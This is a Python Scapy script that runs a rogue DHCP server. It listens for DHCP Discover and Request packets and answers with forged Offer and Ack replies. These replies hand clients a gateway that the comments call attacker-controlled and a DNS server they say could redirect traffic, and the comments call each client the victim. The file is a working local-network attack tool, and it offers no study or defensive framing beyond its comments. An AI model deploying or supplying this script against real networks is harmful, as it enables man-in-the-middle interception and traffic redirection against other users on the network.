#!/usr/bin/env python3
from scapy.all import *
import random

# Function that will be called every time we sniff a DHCP packet
def dhcp_offer(pkt):
    """Respond to DHCP Discover/Request packets with fake Offer/Ack"""

    # Check if packet has a DHCP layer and its message type = 1 (Discover)
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        print("[*] DHCP Discover detected")

        # Generate a random IP in the 192.168.1.100-200 range to "offer" the victim
        offered_ip = f"192.168.1.{random.randint(100,200)}"
        router_ip = "192.168.1.1"   # Fake default gateway (attacker-controlled)
        dns_ip = "8.8.8.8"          # DNS server (could be fake too)

        # Construct Ethernet frame
        ether = Ether(
            src=get_if_hwaddr(conf.iface),    # our NIC MAC (pretend to be DHCP server)
            dst="ff:ff:ff:ff:ff:ff"           # broadcast to all
        )

        # Construct IP layer
        ip = IP(
            src="192.168.1.1",                # pretend DHCP server IP
            dst="255.255.255.255"             # broadcast
        )

        # UDP header for DHCP (server → client is port 67 → 68)
        udp = UDP(sport=67, dport=68)

        # BOOTP (DHCP is built on top of BOOTP)
        bootp = BOOTP(
            op=2,                             # 2 = reply
            yiaddr=offered_ip,                # "Your IP" (what we assign to victim)
            siaddr="192.168.1.1",             # DHCP server (fake)
            chaddr=pkt[BOOTP].chaddr,         # client hardware (MAC) from original request
            xid=pkt[BOOTP].xid                # transaction ID (must match victim's)
        )

        # DHCP options: we send an "offer"
        dhcp = DHCP(options=[
            ("message-type", "offer"),        # Offer = step 2 in DHCP handshake
            ("server_id", "192.168.1.1"),     # pretend to be DHCP server
            ("lease_time", 600),              # lease time in seconds
            ("subnet_mask", "255.255.255.0"),
            ("router", router_ip),            # default gateway = attacker
            ("name_server", dns_ip),          # DNS server (could redirect traffic)
            "end"
        ])

        # Combine all layers into one packet
        offer = ether / ip / udp / bootp / dhcp

        # Send it out
        sendp(offer, iface=conf.iface, verbose=0)
        print(f"[+] Sent fake DHCP Offer with IP {offered_ip}")

    # If the client sends a DHCP Request (type=3)
    elif DHCP in pkt and pkt[DHCP].options[0][1] == 3:  # DHCP Request
        print("[*] DHCP Request detected")

        # Send back DHCP Ack (acknowledge and finalize lease)
        ack = Ether(
            src=get_if_hwaddr(conf.iface), dst="ff:ff:ff:ff:ff:ff"
        ) / IP(
            src="192.168.1.1", dst="255.255.255.255"
        ) / UDP(
            sport=67, dport=68
        ) / BOOTP(
            op=2,
            yiaddr="192.168.1.150",            # confirm the IP we "assign"
            chaddr=pkt[BOOTP].chaddr,
            xid=pkt[BOOTP].xid
        ) / DHCP(options=[
            ("message-type", "ack"),           # DHCP Ack = final step
            ("server_id", "192.168.1.1"),
            ("lease_time", 600),
            ("subnet_mask", "255.255.255.0"),
            ("router", "192.168.1.1"),         # still attacker-controlled gateway
            ("name_server", "8.8.8.8"),
            "end"
        ])

        sendp(ack, iface=conf.iface, verbose=0)
        print("[+] Sent fake DHCP Ack")

def main():
    print("[+] Listening for DHCP traffic...")
    # Sniff for DHCP-related UDP packets (ports 67 and 68)
    sniff(filter="udp and (port 67 or 68)", prn=dhcp_offer, store=0)

if __name__ == "__main__":
    main()
